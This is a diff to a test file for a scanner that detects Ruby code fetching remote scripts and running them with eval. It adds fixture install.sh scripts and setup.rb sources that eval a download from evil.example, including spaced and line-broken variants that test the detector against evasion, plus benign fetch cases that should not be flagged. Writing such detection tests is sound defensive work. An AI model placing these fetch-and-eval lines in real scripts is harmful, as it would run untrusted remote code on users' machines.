@@ -32,6 +32,27 @@ const FETCHED_CODE: Record<string, [string, string]> = {
     "install.sh",
     "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get_response(URI('https://evil.example/x.rb')).body)\"\n",
   ],
+  "ruby eval of Net::HTTP.get with URI.parse in an install script": [
+    "install.sh",
+    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\"\n",
+  ],
+  "ruby eval of Net::HTTP.get_response with URI.parse in an install script": [
+    "install.sh",
+    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get_response(URI.parse('https://evil.example/x.rb')).body)\"\n",
+  ],
+  "ruby eval of Net::HTTP.get with a spaced URI .parse in an install script": [
+    "install.sh",
+    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI .parse('https://evil.example/x.rb')))\"\n",
+  ],
+  "ruby eval of Net::HTTP.get_response with a line-broken URI.parse in Ruby source":
+    [
+      "tools/setup.rb",
+      "require 'net/http'\neval(Net::HTTP.get_response(URI\n  .parse('https://evil.example/x.rb')).body)\n",
+    ],
+  "ruby eval of Net::HTTP.get with URI.parse in Ruby source": [
+    "tools/setup.rb",
+    "require 'net/http'\neval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\n",
+  ],
   "ruby eval of URI.open in Ruby source": [
     "tools/setup.rb",
     "require 'open-uri'\neval(URI.open('https://evil.example/x.rb').read)\n",
@@ -98,6 +119,10 @@ test("fetching data without executing it keeps no finding", () => {
       "tools/fetch.rb",
       "require 'open-uri'\nputs URI.open('https://example.com/data.json').read\n",
     ],
+    [
+      "tools/fetch.rb",
+      "require 'net/http'\nputs Net::HTTP.get(URI.parse('https://example.com/data.json'))\n",
+    ],
   ] as const) {
     expect({ path, findings: categories(inspected(path, body)) }).toEqual({
       path,
@@ -149,6 +174,7 @@ test("response objects and unrelated later fetches are not executed bodies", () 
     'eval(URI.open("https://example.com/payload.rb"))',
     'eval(open("https://example.com/payload.rb").read)',
     'eval(Net::HTTP.get_response(URI("https://example.com/payload.rb")))',
+    'eval(Net::HTTP.get_response(URI.parse("https://example.com/payload.rb")))',
     'eval("puts :local"); URI.open("https://example.com/data").read',
     'exec("local command"); file_get_contents("https://example.com/data")',
     'eval(file_get_contents("https://example.com/data").length)',
